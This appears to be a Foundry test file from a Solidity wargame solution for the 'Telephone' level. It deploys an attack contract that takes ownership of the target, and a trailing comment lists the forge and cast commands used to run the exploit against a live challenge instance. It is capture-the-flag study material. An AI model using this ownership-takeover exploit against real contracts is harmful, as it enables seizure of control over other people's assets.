// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";
import {TelephoneAttack} from "../solutions/TelephoneAttack.sol";

contract TelephoneTest is Test {
    Telephone public telephone;
    TelephoneAttack public attackContract;
    address public attacker;

    function setUp() public {
        telephone = new Telephone();
        attacker = makeAddr("attacker");
    }

    function test_changeOwner() public {
        vm.startPrank(attacker);

        attackContract = new TelephoneAttack(address(telephone));
        attackContract.attack();

        assertEq(telephone.owner(), attacker);

        vm.stopPrank();
    }
}

/*
Instance address: 0x6C647ef703fD4656d8282322F016aEee8a2C1cE6
source .env
export telephone=0x6C647ef703fD4656d8282322F016aEee8a2C1cE6

forge create solutions/TelephoneAttack.sol:TelephoneAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $telephone

Attack contract address: 0x9B15980Bd52b6531A0d8a8CAeD03ea3c6649f048
export attack=0x9B15980Bd52b6531A0d8a8CAeD03ea3c6649f048
cast call $telephone "owner()" --rpc-url $RPC_URL
cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
